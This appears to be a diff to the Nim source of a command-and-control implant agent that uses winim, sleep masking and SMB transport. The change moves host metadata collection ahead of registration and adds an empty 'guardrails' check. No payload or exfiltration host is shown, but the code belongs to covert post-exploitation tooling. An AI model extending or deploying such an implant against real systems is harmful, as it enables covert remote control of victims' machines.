@@ -1,6 +1,6 @@
 import winim/lean
 import times, system, random, strformat, tables
-import utils/io
+import utils/[io, metadata]
 import core/[context, sleepmask, exit, transport, job]
 import core/transport/smb
 import protocol/[task, result, registration]
@@ -14,6 +14,12 @@ proc agentMain() =
     var ctx = AgentCtx.init()
     if ctx == nil: 
         quit(0)
+
+    # Retrieve agent metadata
+    let metadata = ctx.collectAgentMetadata()
+    
+    # Check guardrails
+    
 
     #[
         Agent routine: 
@@ -40,7 +46,7 @@ proc agentMain() =
             # Register
             if not ctx.registered: 
                 # Create registration payload   
-                var registration: Registration = ctx.collectAgentMetadata()
+                var registration: Registration = ctx.createRegistration(metadata)
                 let registrationBytes = ctx.serializeRegistrationData(registration)
 
                 if ctx.sendData(@[uint8(1)] & uint32.toBytes(cast[uint32](registrationBytes.len())) & registrationBytes): 
